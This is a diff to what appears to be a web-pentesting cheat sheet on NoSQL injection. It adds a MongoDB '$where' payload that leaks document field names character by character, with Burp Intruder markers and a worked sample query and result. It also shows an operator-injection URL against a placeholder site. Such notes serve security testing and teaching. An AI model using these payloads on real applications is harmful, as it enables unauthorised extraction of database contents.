@@ -168,9 +168,49 @@ https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
 
 * You can inject operator?
   * `"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
-  *   This inspects the first data field in the user object and returns the first character of the field name. You can extract the field name char by char
+  * This query selects documents where the first key (field) of the document starts with the letter "a". You can extract the field name char by char
 
-      \
+<details>
+
+<summary>Example</summary>
+
+```json
+{
+"username":"test",
+"$where":"Object.keys(this)[§1§].match('^.{0}§u§.*')"
+}
+```
+
+With intruder set: 1 payload: numbers, 2 payload: bruteforce chars.
+
+
+
+You have :&#x20;
+
+```json
+[
+    { "apple": "fruit", "color": "red" },
+    { "banana": "fruit", "color": "yellow" },
+    { "avocado": "fruit", "color": "green" },
+    { "berry": "fruit", "color": "blue" }
+]
+```
+
+Query
+
+```javascript
+db.collection.find({ "$where": "Object.keys(this)[0].match('^.{0}a.*')" })
+```
+
+```json
+[
+    { "apple": "fruit", "color": "red" },
+    { "avocado": "fruit", "color": "green" }
+]
+```
+
+</details>
+
 
 
 ## Timing based injection
